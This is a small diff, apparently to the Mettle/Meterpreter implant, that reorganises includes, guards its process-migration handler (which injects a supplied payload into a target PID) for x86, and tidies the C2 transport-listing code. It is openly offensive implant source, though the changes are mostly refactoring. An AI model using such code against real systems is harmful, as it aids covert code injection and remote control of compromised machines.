@@ -11,8 +11,8 @@
 #include "util-common.h"
 #include "bufferev.h"
 #include "network_client.h"
-#include "base_inject.h"
 #include "c2.h"
+#include "base_inject.h"
 
 #include <mettle.h>
 #include <errno.h>
@@ -20,21 +20,17 @@
 #include <unistd.h>
 #include <fcntl.h>
 
-static void add_command_id(uint32_t command_id, void *arg)
-{
-	struct tlv_packet **p = arg;
-	*p = tlv_packet_add_u32(*p, TLV_TYPE_UINT, command_id);
-}
 static struct tlv_packet *core_migrate(struct tlv_handler_ctx *ctx)
 {
 
 	uint32_t pid;
 	uint32_t destination_arch;
-  	size_t payload_length, uuid_length, stub_length;
+	size_t payload_length, uuid_length, stub_length;
 
 	struct mettle *m = ctx->arg;
 	struct tlv_dispatcher *td = mettle_get_tlv_dispatcher(m);
-	
+		
+#if defined(__x86_64__) || defined(__i386__)
 	if(migrate_support())
 	{
 		tlv_packet_get_u32(ctx->req, TLV_TYPE_MIGRATE_PID, &pid);
@@ -46,7 +42,6 @@ static struct tlv_packet *core_migrate(struct tlv_handler_ctx *ctx)
 		if (!payload || payload_length == 0)
 			return tlv_packet_response_result(ctx, TLV_RESULT_FAILURE);
 		      
-		//char *uuid = tlv_packet_get_raw(ctx->req, TLV_TYPE_UUID, &uuid_length);
 		const char *uuid = tlv_dispatcher_get_uuid(td,&uuid_length);
 
 		char *migrate_stub = tlv_packet_get_raw(ctx->req, TLV_TYPE_MIGRATE_STUB, &stub_length);
@@ -66,10 +61,18 @@ static struct tlv_packet *core_migrate(struct tlv_handler_ctx *ctx)
 		      return p;
 		}
 	}
-	
+#endif
+		
 	struct tlv_packet *p = tlv_packet_response_result(ctx, TLV_RESULT_FAILURE);
 
 	return p;
+}
+
+
+static void add_command_id(uint32_t command_id, void *arg)
+{
+	struct tlv_packet **p = arg;
+	*p = tlv_packet_add_u32(*p, TLV_TYPE_UINT, command_id);
 }
 
 static struct tlv_packet *core_enumextcmd(struct tlv_handler_ctx *ctx)
@@ -276,12 +279,12 @@ static struct tlv_packet *core_transport_list(struct tlv_handler_ctx *ctx)
 	struct c2_transport * current_transport = c2_get_current_transport(c2);
 	
 	struct tlv_packet *p = tlv_packet_response_result(ctx, TLV_RESULT_SUCCESS);
-
+	
 	do {
 		struct tlv_packet *packet_group = tlv_packet_new(TLV_TYPE_TRANS_GROUP, 0);
-		packet_group = tlv_packet_add_str(packet_group, TLV_TYPE_TRANS_URL, c2_transport_uri(current_transport));	
+		packet_group = tlv_packet_add_str(packet_group, TLV_TYPE_TRANS_URL, c2_transport_uri(current_transport));
+
 		if (packet_group) {
-			printf("Adding transport '%s' to transport list response\n", c2_transport_uri(current_transport));
 			p = tlv_packet_add_child(p, packet_group);
 		}
 		current_transport =  c2_get_next_transport(current_transport);
